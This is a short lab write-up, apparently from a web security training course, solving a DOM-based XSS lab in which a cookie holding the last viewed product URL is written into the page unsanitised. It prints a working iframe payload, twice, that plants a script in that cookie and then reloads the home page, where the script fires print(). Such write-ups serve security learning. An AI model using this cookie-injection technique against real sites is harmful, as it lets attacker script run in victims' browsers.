# Lab: DOM-Based Cookie Manipulation

## Description

The application uses a client-side cookie named `lastViewedProduct` to store the URL of the last product page visited by the user. The value of this cookie is later inserted into the page without proper sanitization, resulting in a DOM-based XSS vulnerability.

## Steps

1. Observed that visiting a product page updates the `lastViewedProduct` cookie with the URL of that page.

2. Used the exploit server and inserted the following payload (replace `YOUR-LAB-ID` with the actual lab ID):

```html id="pw8ybq"
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

3. Stored the exploit and delivered it to the victim.

## Explanation

* The iframe initially loads a product page containing the XSS payload:

```html id="f3tb7s"
'><script>print()</script>
```

* Since the page is a product page, its URL is saved into the `lastViewedProduct` cookie.

* The `onload` handler then redirects the victim back to the home page:

```javascript id="sk8vjo"
if(!window.x)
    this.src='https://YOUR-LAB-ID.web-security-academy.net';
window.x=1;
```

* When the home page loads, it reads the `lastViewedProduct` cookie and inserts its value into the page.

* Because the cookie contains the injected script, the browser executes:

```javascript id="wz7gf4"
print()
```

which triggers the print dialog and solves the lab.

## Source and Sink

* **Source:** `document.cookie` (`lastViewedProduct`)
* **Sink:** HTML insertion (`innerHTML`)
* **Impact:** DOM-Based Cross-Site Scripting (XSS)

## Payload

```html id="i8utmk"
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
